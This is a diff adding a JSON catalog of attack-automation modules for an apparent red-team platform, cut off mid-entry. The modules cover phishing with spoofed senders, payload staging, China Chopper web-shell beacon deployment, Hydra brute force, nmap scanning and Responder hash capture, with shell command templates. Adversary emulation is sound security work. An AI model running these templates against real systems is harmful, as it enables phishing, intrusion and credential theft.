@@ -1,0 +1,2284 @@
+{
+  "packageVersion": "2026-01-09-v2",
+  "description": "Complete Robot Framework utility library modules for automation and infrastructure setup",
+  "collections": [
+    {
+      "name": "LibraryModule",
+      "documents": [
+        {
+          "_key": "lib_util_phishing_create_email",
+          "id": "util-phishing-create",
+          "name": "Create Phishing Email",
+          "icon": "",
+          "tactic": "TA0001",
+          "mitre": {
+            "tacticId": "TA0001",
+            "techniqueId": "T1566.001"
+          },
+          "category": "Robot Utility",
+          "subcategory": "Phishing",
+          "description": "Construct phishing email with sender, targets, subject, and body",
+          "riskLevel": "medium",
+          "estimatedDuration": 60,
+          "executionType": "robot_utility",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": "Create the Phishing Email",
+          "robotTemplate": "Create the Phishing Email    host_ip=${host_ip}    port=${port}    sender=${sender}    target_list=${target_list}    email_header=${email_header}    email_body=${email_body}    attachment=${attachment}    payload_name=${payload_name}",
+          "robotLibrary": "PhishingLibrary.py",
+          "shellCommand": null,
+          "inputs": [],
+          "outputs": [
+            {
+              "id": "email_ready",
+              "label": "Phishing Email",
+              "type": "Phishing_Email",
+              "description": "Configured email ready to send"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "host_ip",
+              "label": "HTTP Server IP",
+              "type": "string",
+              "required": true,
+              "placeholder": "192.168.1.100",
+              "default": null,
+              "description": "IP of HTTP server hosting payload"
+            },
+            {
+              "id": "port",
+              "label": "HTTP Server Port",
+              "type": "number",
+              "required": true,
+              "placeholder": "8080",
+              "default": 8080,
+              "description": "Port of HTTP server"
+            },
+            {
+              "id": "sender",
+              "label": "Sender Email",
+              "type": "string",
+              "required": true,
+              "placeholder": "support@company.com",
+              "default": null,
+              "description": "Spoofed sender address"
+            },
+            {
+              "id": "target_list",
+              "label": "Target List File",
+              "type": "file",
+              "required": true,
+              "placeholder": "/tmp/targets.txt",
+              "default": null,
+              "description": "File with target emails (one per line)"
+            },
+            {
+              "id": "email_header",
+              "label": "Email Subject",
+              "type": "string",
+              "required": true,
+              "placeholder": "Urgent: Security Update Required",
+              "default": null,
+              "description": "Email subject line"
+            },
+            {
+              "id": "email_body",
+              "label": "Email Body File",
+              "type": "file",
+              "required": true,
+              "placeholder": "/tmp/body.html",
+              "default": null,
+              "description": "Path to HTML body template"
+            },
+            {
+              "id": "attachment",
+              "label": "Attachment (Optional)",
+              "type": "file",
+              "required": false,
+              "placeholder": "/tmp/invoice.pdf",
+              "default": null,
+              "description": "Optional file attachment"
+            },
+            {
+              "id": "payload_name",
+              "label": "Payload Filename",
+              "type": "string",
+              "required": false,
+              "placeholder": "update.exe",
+              "default": null,
+              "description": "Name of payload for download link"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": ["PhishingLibrary.py"]
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from Robot Framework utilities",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["phishing", "email", "social-engineering", "robot-framework"]
+          },
+          "outputObjects": [
+            {
+              "type": "Phishing_Email",
+              "collection": "Phishing_Email",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "phish_${run_id}_${step_id}",
+              "schema": {
+                "sender": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "recipients": {
+                  "type": "array",
+                  "nullable": false
+                },
+                "subject": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "bodyPath": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "attachments": {
+                  "type": "array",
+                  "nullable": true
+                },
+                "payloadUrl": {
+                  "type": "string",
+                  "nullable": true
+                },
+                "createdAt": {
+                  "type": "datetime",
+                  "nullable": false
+                },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": {
+                      "type": "string"
+                    },
+                    "runId": {
+                      "type": "string"
+                    },
+                    "stepId": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        {
+          "_key": "lib_util_phishing_send_email",
+          "id": "util-phishing-send",
+          "name": "Send Phishing Email",
+          "icon": "",
+          "tactic": "TA0001",
+          "mitre": {
+            "tacticId": "TA0001",
+            "techniqueId": "T1566.001"
+          },
+          "category": "Robot Utility",
+          "subcategory": "Phishing",
+          "description": "Send configured phishing email via SMTP",
+          "riskLevel": "high",
+          "estimatedDuration": 30,
+          "executionType": "robot_utility",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": "Send the Email",
+          "robotTemplate": "Send the Email    email_server=${email_server}    email_port=${email_port}",
+          "robotLibrary": "PhishingLibrary.py",
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "phishing_email",
+              "label": "Phishing Email",
+              "type": "Phishing_Email",
+              "required": true,
+              "description": "Configured email from Create Phishing Email"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "campaign_result",
+              "label": "Email Campaign Result",
+              "type": "Email_Campaign_Result",
+              "description": "Send status and metrics"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "email_server",
+              "label": "SMTP Server",
+              "type": "string",
+              "required": true,
+              "placeholder": "smtp.gmail.com",
+              "default": null,
+              "description": "SMTP server address"
+            },
+            {
+              "id": "email_port",
+              "label": "SMTP Port",
+              "type": "number",
+              "required": true,
+              "placeholder": "587",
+              "default": 587,
+              "description": "SMTP server port"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": ["smtp-cli"],
+            "libraries": ["PhishingLibrary.py"]
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from Robot Framework utilities",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["phishing", "email", "smtp", "robot-framework"]
+          },
+          "outputObjects": [
+            {
+              "type": "Email_Campaign_Result",
+              "collection": "Email_Campaign_Result",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "phish_result_${run_id}_${step_id}",
+              "schema": {
+                "sentCount": {
+                  "type": "number",
+                  "nullable": false
+                },
+                "failedCount": {
+                  "type": "number",
+                  "nullable": true
+                },
+                "timestamp": {
+                  "type": "datetime",
+                  "nullable": false
+                },
+                "smtpServer": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": {
+                      "type": "string"
+                    },
+                    "runId": {
+                      "type": "string"
+                    },
+                    "stepId": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        {
+          "_key": "lib_util_http_start_server",
+          "id": "util-http-start",
+          "name": "Start HTTP Server",
+          "icon": "",
+          "tactic": "TA0001",
+          "mitre": {
+            "tacticId": "TA0001",
+            "techniqueId": "T1583.006"
+          },
+          "category": "Robot Utility",
+          "subcategory": "Infrastructure",
+          "description": "Start local HTTP server for payload staging",
+          "riskLevel": "low",
+          "estimatedDuration": 15,
+          "executionType": "robot_utility",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": "Start Local HTTP Server",
+          "robotTemplate": "Start Local HTTP Server    host_directory=${host_directory}    upload_directory=${upload_directory}    http_server_port=${http_server_port}",
+          "robotLibrary": "HTTPLibrary.py",
+          "shellCommand": null,
+          "inputs": [],
+          "outputs": [
+            {
+              "id": "http_server",
+              "label": "HTTP Server",
+              "type": "HTTP_Server",
+              "description": "Running HTTP server instance"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "host_directory",
+              "label": "Host Directory",
+              "type": "string",
+              "required": true,
+              "placeholder": "/tmp/payloads",
+              "default": null,
+              "description": "Directory to serve files from"
+            },
+            {
+              "id": "upload_directory",
+              "label": "Upload Directory",
+              "type": "string",
+              "required": true,
+              "placeholder": "/tmp/uploads",
+              "default": null,
+              "description": "Directory for file uploads"
+            },
+            {
+              "id": "http_server_port",
+              "label": "Server Port",
+              "type": "number",
+              "required": true,
+              "placeholder": "8080",
+              "default": 8080,
+              "description": "Port to listen on"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": ["HTTPLibrary.py"]
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from Robot Framework utilities",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["http", "staging", "infrastructure", "robot-framework"]
+          },
+          "outputObjects": [
+            {
+              "type": "HTTP_Server",
+              "collection": "HTTP_Server",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "http_server_${run_id}_${step_id}",
+              "schema": {
+                "hostDirectory": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "uploadDirectory": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "port": {
+                  "type": "number",
+                  "nullable": false
+                },
+                "pid": {
+                  "type": "number",
+                  "nullable": true
+                },
+                "status": {
+                  "type": "string",
+                  "nullable": false,
+                  "default": "running"
+                },
+                "startedAt": {
+                  "type": "datetime",
+                  "nullable": false
+                },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": {
+                      "type": "string"
+                    },
+                    "runId": {
+                      "type": "string"
+                    },
+                    "stepId": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        {
+          "_key": "lib_util_http_stop_server",
+          "id": "util-http-stop",
+          "name": "Stop HTTP Server",
+          "icon": "",
+          "tactic": "TA0005",
+          "mitre": {
+            "tacticId": "TA0005",
+            "techniqueId": null
+          },
+          "category": "Robot Utility",
+          "subcategory": "Infrastructure",
+          "description": "Stop running HTTP server",
+          "riskLevel": "low",
+          "estimatedDuration": 5,
+          "executionType": "robot_utility",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": "Stop Local HTTP Server",
+          "robotTemplate": "Stop Local HTTP Server",
+          "robotLibrary": "HTTPLibrary.py",
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "http_server",
+              "label": "HTTP Server",
+              "type": "HTTP_Server",
+              "required": true,
+              "description": "Server instance to stop"
+            }
+          ],
+          "outputs": [],
+          "parameters": [],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": ["HTTPLibrary.py"]
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from Robot Framework utilities",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["http", "cleanup", "infrastructure", "robot-framework"]
+          },
+          "outputObjects": []
+        },
+        {
+          "_key": "lib_util_chinachopper_exploit",
+          "id": "util-chinachopper",
+          "name": "China Chopper Web Shell",
+          "icon": "",
+          "tactic": "TA0001",
+          "mitre": {
+            "tacticId": "TA0001",
+            "techniqueId": "T1190"
+          },
+          "category": "Robot Utility",
+          "subcategory": "Web Shell",
+          "description": "Execute commands via China Chopper web shell",
+          "riskLevel": "critical",
+          "estimatedDuration": 45,
+          "executionType": "robot_utility",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": "Copy and Activate Payload using Chinachopper",
+          "robotTemplate": "Copy and Activate Payload using Chinachopper    webshell_server=${webshell_server}    payload_location=${payload_location}    payload_name=${payload_name}    http_url=${http_url}    beacon_filename=${beacon_filename}",
+          "robotLibrary": null,
+          "shellCommand": "python3 chinachopper.py ${webshell_server} ${post_param} ${command}",
+          "inputs": [],
+          "outputs": [
+            {
+              "id": "webshell_session",
+              "label": "Web Shell Session",
+              "type": "WebShell_Session",
+              "description": "Active web shell connection"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "webshell_server",
+              "label": "Web Shell URL",
+              "type": "string",
+              "required": true,
+              "placeholder": "http://192.168.3.14/interface.aspx",
+              "default": null,
+              "description": "URL of vulnerable web shell"
+            },
+            {
+              "id": "payload_location",
+              "label": "Target Payload Path",
+              "type": "string",
+              "required": true,
+              "placeholder": "C:\\inetpub\\wwwroot\\payload.exe",
+              "default": null,
+              "description": "Where to save payload on target"
+            },
+            {
+              "id": "payload_name",
+              "label": "Payload Filename",
+              "type": "string",
+              "required": true,
+              "placeholder": "update.exe",
+              "default": null,
+              "description": "Name of payload file"
+            },
+            {
+              "id": "http_url",
+              "label": "HTTP Server URL",
+              "type": "string",
+              "required": true,
+              "placeholder": "192.168.1.100:8080",
+              "default": null,
+              "description": "HTTP server hosting payload"
+            },
+            {
+              "id": "beacon_filename",
+              "label": "Beacon Filename",
+              "type": "string",
+              "required": true,
+              "placeholder": "beacon.exe",
+              "default": null,
+              "description": "Beacon file on HTTP server"
+            },
+            {
+              "id": "post_param",
+              "label": "POST Parameter",
+              "type": "string",
+              "required": true,
+              "placeholder": "z",
+              "default": "z",
+              "description": "POST parameter for web shell"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": ["chinachopper.py"],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from Robot Framework utilities",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["webshell", "china-chopper", "initial-access", "robot-framework"]
+          },
+          "outputObjects": [
+            {
+              "type": "WebShell_Session",
+              "collection": "WebShell_Session",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "webshell_${run_id}_${step_id}",
+              "schema": {
+                "webshellUrl": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "postParameter": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "targetHost": {
+                  "type": "string",
+                  "nullable": true
+                },
+                "establishedAt": {
+                  "type": "datetime",
+                  "nullable": false
+                },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": {
+                      "type": "string"
+                    },
+                    "runId": {
+                      "type": "string"
+                    },
+                    "stepId": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        {
+          "_key": "lib_util_nmap_scan",
+          "id": "util-nmap-scan",
+          "name": "Nmap Network Scan",
+          "icon": "",
+          "tactic": "TA0007",
+          "mitre": {
+            "tacticId": "TA0007",
+            "techniqueId": "T1046"
+          },
+          "category": "Robot Utility",
+          "subcategory": "Network Discovery",
+          "description": "Run Nmap scan against target network",
+          "riskLevel": "low",
+          "estimatedDuration": 120,
+          "executionType": "robot_utility",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": "Run Nmap Scan",
+          "robotTemplate": "Run Nmap Scan    host=${host}    username=${username}    password=${password}    target_ip=${target_ip}",
+          "robotLibrary": null,
+          "shellCommand": "nmap ${nmap_args} ${target_ip}",
+          "inputs": [],
+          "outputs": [
+            {
+              "id": "scan_results",
+              "label": "Scan Results",
+              "type": "Network_Scan_Results",
+              "description": "Discovered hosts and services"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "host",
+              "label": "Scanner Host",
+              "type": "string",
+              "required": true,
+              "placeholder": "192.168.1.50",
+              "default": null,
+              "description": "Linux box to run scan from"
+            },
+            {
+              "id": "username",
+              "label": "SSH Username",
+              "type": "string",
+              "required": true,
+              "placeholder": "kali",
+              "default": null,
+              "description": "SSH username"
+            },
+            {
+              "id": "password",
+              "label": "SSH Password",
+              "type": "string",
+              "required": true,
+              "placeholder": "kali",
+              "default": null,
+              "description": "SSH password"
+            },
+            {
+              "id": "target_ip",
+              "label": "Target IP/CIDR",
+              "type": "string",
+              "required": true,
+              "placeholder": "192.168.1.0/24",
+              "default": null,
+              "description": "Target IP or network range"
+            },
+            {
+              "id": "nmap_args",
+              "label": "Nmap Arguments",
+              "type": "string",
+              "required": false,
+              "placeholder": "-sS -sV -O",
+              "default": "-sS -sV",
+              "description": "Additional Nmap flags"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": ["scanner"],
+            "externalTools": ["nmap"],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from Robot Framework utilities",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["nmap", "scanning", "discovery", "reconnaissance", "robot-framework"]
+          },
+          "outputObjects": [
+            {
+              "type": "Network_Scan_Results",
+              "collection": "Network_Scan_Results",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "nmap_${run_id}_${step_id}",
+              "schema": {
+                "targetNetwork": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "hostsDiscovered": {
+                  "type": "number",
+                  "nullable": true
+                },
+                "scanOutput": {
+                  "type": "string",
+                  "nullable": true
+                },
+                "scanArgs": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "timestamp": {
+                  "type": "datetime",
+                  "nullable": false
+                },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": {
+                      "type": "string"
+                    },
+                    "runId": {
+                      "type": "string"
+                    },
+                    "stepId": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        {
+          "_key": "lib_util_hydra_attack",
+          "id": "util-hydra",
+          "name": "Hydra Password Attack",
+          "icon": "",
+          "tactic": "TA0006",
+          "mitre": {
+            "tacticId": "TA0006",
+            "techniqueId": "T1110"
+          },
+          "category": "Robot Utility",
+          "subcategory": "Brute Force",
+          "description": "Run Hydra password brute force attack",
+          "riskLevel": "high",
+          "estimatedDuration": 300,
+          "executionType": "robot_utility",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": "Run Hydra",
+          "robotTemplate": "Run Hydra    host=${host}    username=${username}    password=${password}    target_ip=${target_ip}",
+          "robotLibrary": null,
+          "shellCommand": "hydra -L users.txt -P passwords.txt ${protocol}://${target_ip}",
+          "inputs": [],
+          "outputs": [
+            {
+              "id": "cracked_credentials",
+              "label": "Cracked Credentials",
+              "type": "Credential_Set",
+              "description": "Successfully cracked credentials"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "host",
+              "label": "Attacker Host",
+              "type": "string",
+              "required": true,
+              "placeholder": "192.168.1.50",
+              "default": null,
+              "description": "Linux box to run Hydra from"
+            },
+            {
+              "id": "username",
+              "label": "SSH Username",
+              "type": "string",
+              "required": true,
+              "placeholder": "kali",
+              "default": null,
+              "description": "SSH username"
+            },
+            {
+              "id": "password",
+              "label": "SSH Password",
+              "type": "string",
+              "required": true,
+              "placeholder": "kali",
+              "default": null,
+              "description": "SSH password"
+            },
+            {
+              "id": "target_ip",
+              "label": "Target IP",
+              "type": "string",
+              "required": true,
+              "placeholder": "192.168.1.100",
+              "default": null,
+              "description": "Target machine IP"
+            },
+            {
+              "id": "protocol",
+              "label": "Target Protocol",
+              "type": "select",
+              "required": true,
+              "placeholder": null,
+              "default": "ssh",
+              "options": ["ssh", "rdp", "smb", "ftp", "http"],
+              "description": "Service to attack"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": ["attacker"],
+            "externalTools": ["hydra"],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from Robot Framework utilities",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["hydra", "brute-force", "password-cracking", "robot-framework"]
+          },
+          "outputObjects": [
+            {
+              "type": "Credential_Set",
+              "collection": "Credential_Set",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "hydra_creds_${run_id}_${step_id}",
+              "schema": {
+                "credentials": {
+                  "type": "array",
+                  "nullable": false,
+                  "items": {
+                    "type": "object",
+                    "properties": {
+                      "username": {
+                        "type": "string"
+                      },
+                      "password": {
+                        "type": "string"
+                      },
+                      "service": {
+                        "type": "string"
+                      }
+                    }
+                  }
+                },
+                "targetHost": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "protocol": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "timestamp": {
+                  "type": "datetime",
+                  "nullable": false
+                },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": {
+                      "type": "string"
+                    },
+                    "runId": {
+                      "type": "string"
+                    },
+                    "stepId": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        {
+          "_key": "lib_util_ssh_connect",
+          "id": "util-ssh-connect",
+          "name": "Open SSH Terminal",
+          "icon": "",
+          "tactic": "control",
+          "mitre": {
+            "tacticId": null,
+            "techniqueId": null
+          },
+          "category": "Robot Utility",
+          "subcategory": "Terminal Access",
+          "description": "Open SSH connection to remote Linux system",
+          "riskLevel": "low",
+          "estimatedDuration": 10,
+          "executionType": "robot_utility",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": "Get Linux Terminal",
+          "robotTemplate": "Get Linux Terminal    host=${host}    username=${username}    password=${password}    alias=${alias}",
+          "robotLibrary": "SSHLibrary",
+          "shellCommand": null,
+          "inputs": [],
+          "outputs": [
+            {
+              "id": "ssh_connection",
+              "label": "SSH Connection",
+              "type": "SSH_Connection",
+              "description": "Active SSH session"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "host",
+              "label": "Target Host",
+              "type": "string",
+              "required": true,
+              "placeholder": "192.168.1.50",
+              "default": null,
+              "description": "IP or hostname"
+            },
+            {
+              "id": "username",
+              "label": "Username",
+              "type": "string",
+              "required": true,
+              "placeholder": "kali",
+              "default": null,
+              "description": "SSH username"
+            },
+            {
+              "id": "password",
+              "label": "Password",
+              "type": "string",
+              "required": true,
+              "placeholder": "kali",
+              "default": null,
+              "description": "SSH password"
+            },
+            {
+              "id": "alias",
+              "label": "Connection Alias",
+              "type": "string",
+              "required": true,
+              "placeholder": "kali-box",
+              "default": null,
+              "description": "Name for this connection"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": ["SSHLibrary"]
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from Robot Framework utilities",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["ssh", "terminal", "connection", "robot-framework"]
+          },
+          "outputObjects": [
+            {
+              "type": "SSH_Connection",
+              "collection": "SSH_Connection",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "ssh_${alias}_${run_id}",
+              "schema": {
+                "host": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "username": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "alias": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "port": {
+                  "type": "number",
+                  "nullable": false,
+                  "default": 22
+                },
+                "status": {
+                  "type": "string",
+                  "nullable": false,
+                  "default": "connected"
+                },
+                "connectedAt": {
+                  "type": "datetime",
+                  "nullable": false
+                },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": {
+                      "type": "string"
+                    },
+                    "runId": {
+                      "type": "string"
+                    },
+                    "stepId": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        {
+          "_key": "lib_util_ssh_execute",
+          "id": "util-ssh-execute",
+          "name": "Execute SSH Command",
+          "icon": "",
+          "tactic": "TA0002",
+          "mitre": {
+            "tacticId": "TA0002",
+            "techniqueId": "T1059"
+          },
+          "category": "Robot Utility",
+          "subcategory": "Terminal Access",
+          "description": "Run command on existing SSH connection",
+          "riskLevel": "medium",
+          "estimatedDuration": 15,
+          "executionType": "robot_utility",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": "Run Linux Command",
+          "robotTemplate": "Run Linux Command    host=${host}    username=${username}    password=${password}    command=${command}",
+          "robotLibrary": "SSHLibrary",
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "ssh_connection",
+              "label": "SSH Connection",
+              "type": "SSH_Connection",
+              "required": false,
+              "description": "Optional existing SSH connection"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "command_output",
+              "label": "Command Output",
+              "type": "Command_Output",
+              "description": "Result from command execution"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "host",
+              "label": "Target Host",
+              "type": "string",
+              "required": true,
+              "placeholder": "192.168.1.50",
+              "default": null,
+              "description": "IP or hostname"
+            },
+            {
+              "id": "username",
+              "label": "Username",
+              "type": "string",
+              "required": true,
+              "placeholder": "kali",
+              "default": null,
+              "description": "SSH username"
+            },
+            {
+              "id": "password",
+              "label": "Password",
+              "type": "string",
+              "required": true,
+              "placeholder": "kali",
+              "default": null,
+              "description": "SSH password"
+            },
+            {
+              "id": "command",
+              "label": "Command",
+              "type": "text",
+              "required": true,
+              "placeholder": "sudo nmap -sV 192.168.1.0/24",
+              "default": null,
+              "description": "Bash command to execute"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": ["SSHLibrary"]
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from Robot Framework utilities",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["ssh", "command-execution", "bash", "robot-framework"]
+          },
+          "outputObjects": [
+            {
+              "type": "Command_Output",
+              "collection": "Command_Output",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "ssh_cmd_${run_id}_${step_id}",
+              "schema": {
+                "command": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "stdout": {
+                  "type": "string",
+                  "nullable": true
+                },
+                "stderr": {
+                  "type": "string",
+                  "nullable": true
+                },
+                "exitCode": {
+                  "type": "number",
+                  "nullable": true
+                },
+                "timestamp": {
+                  "type": "datetime",
+                  "nullable": false
+                },
+                "executionType": {
+                  "type": "string",
+                  "nullable": false,
+                  "default": "ssh"
+                },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": {
+                      "type": "string"
+                    },
+                    "runId": {
+                      "type": "string"
+                    },
+                    "stepId": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        {
+          "_key": "lib_util_responder_mitm",
+          "id": "util-responder",
+          "name": "Responder MITM",
+          "icon": "",
+          "tactic": "TA0006",
+          "mitre": {
+            "tacticId": "TA0006",
+            "techniqueId": "T1557.001"
+          },
+          "category": "Robot Utility",
+          "subcategory": "Credential Harvesting",
+          "description": "Run Responder to poison LLMNR/NBT-NS and capture hashes",
+          "riskLevel": "high",
+          "estimatedDuration": 300,
+          "executionType": "robot_utility",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": "sudo ~/Responder/Responder.py -I ${interface} -Pv",
+          "inputs": [],
+          "outputs": [
+            {
+              "id": "captured_hashes",
+              "label": "Captured Hashes",
+              "type": "Credential_Set",
+              "description": "NTLM hashes captured via MITM"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "interface",
+              "label": "Network Interface",
+              "type": "string",
+              "required": true,
+              "placeholder": "ens33",
+              "default": "ens33",
+              "description": "Network interface to listen on"
+            },
+            {
+              "id": "duration",
+              "label": "Capture Duration (seconds)",
+              "type": "number",
+              "required": true,
+              "placeholder": "300",
+              "default": 300,
+              "description": "How long to run Responder"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": ["attacker"],
+            "externalTools": ["Responder"],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from execution plan",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["responder", "mitm", "credential-harvesting", "llmnr", "robot-framework"]
+          },
+          "outputObjects": [
+            {
+              "type": "Credential_Set",
+              "collection": "Credential_Set",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "responder_${run_id}_${step_id}",
+              "schema": {
+                "credentials": {
+                  "type": "array",
+                  "nullable": false,
+                  "items": {
+                    "type": "object",
+                    "properties": {
+                      "username": {
+                        "type": "string"
+                      },
+                      "domain": {
+                        "type": "string"
+                      },
+                      "ntlmHash": {
+                        "type": "string"
+                      },
+                      "credentialType": {
+                        "type": "string"
+                      }
+                    }
+                  }
+                },
+                "timestamp": {
+                  "type": "datetime",
+                  "nullable": false
+                },
+                "captureMethod": {
+                  "type": "string",
+                  "nullable": false,
+                  "default": "responder"
+                },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": {
+                      "type": "string"
+                    },
+                    "runId": {
+                      "type": "string"
+                    },
+                    "stepId": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        {
+          "_key": "lib_util_arp_spoof",
+          "id": "util-arp-spoof",
